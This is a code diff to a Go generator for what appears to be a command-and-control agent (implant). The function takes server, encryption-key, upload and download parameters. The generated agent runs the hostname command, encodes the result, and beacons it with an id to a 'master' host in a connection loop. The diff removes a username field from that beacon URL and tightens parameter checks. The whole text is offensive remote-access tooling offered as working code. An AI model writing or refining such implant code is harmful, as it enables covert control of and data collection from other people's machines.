@@ -4,10 +4,10 @@ import (
 )
 func Generate_agent(protocol, os, server, Path, ConnPath, MsgPath,
 	switch_key,encry_key,download,result,_net,
-    info,upload,list,option,Username,user,uid,hostname,
+    info,upload,list,option,Username,uid,hostname,
 	keyPart,filekey,code,base_rounds,windows_pro string) string {
 	//如果参数有一个为空
-    if protocol == "" || os == "" || server == "" || Path == "" || ConnPath == "" || MsgPath == "" || switch_key == "" || encry_key == "" || download == "" || result == "" || _net == "" || info == "" || upload == "" || list == "" || option == "" || code == "" || base_rounds == "" {
+    if protocol == "" || os == "" || server == "" || Path == "" || ConnPath == "" || MsgPath == "" || switch_key == "" || encry_key == "" || download == "" || result == "" || _net == "" || info == "" || upload == "" || list == "" || option == "" || Username == "" || uid == "" || hostname == "" || keyPart == "" || filekey == "" || code == "" || base_rounds == "" {
         return "parameter null"
     }
     var protocol_str, os_str, main_str, sys_str, tls_str,package_str,send,scan_str,scan_func,inithttp,prototime,protocol_var,protocol_var1,header string
@@ -1284,9 +1284,8 @@ func send() { //发送头部信息
             clientname = strings.TrimSpace(Command("hostname"))
             post_headers["Host"] = master
             get_headers["Host"] = master
-            user_b := customBase64Encode([]byte(user))
             client_b := customBase64Encode([]byte(clientname))
-            url := protocol + master + "//*Path*/?/*option*/=/*ConnPath*/&/*uid*/=" + uid + "&/*user*/=" + user_b + "&/*hostname*/=" + client_b
+            url := protocol + master + "//*Path*/?/*option*/=/*ConnPath*/&/*uid*/=" + uid + "&/*hostname*/=" + client_b
             newKey_map:= generateAndUpdateKey(url)
             for {
                 getConn(&newKey_map)
@@ -1324,7 +1323,6 @@ func send() { //发送头部信息
         `/\*upload\*/`:            upload,
         `/\*list\*/`:              list,
         `/\*option\*/`:            option,
-        `/\*user\*/`:              user,
         `/\*uid\*/`:                uid,
         `/\*hostname\*/`:          hostname,
         `/\*keyPart\*/`:           keyPart,
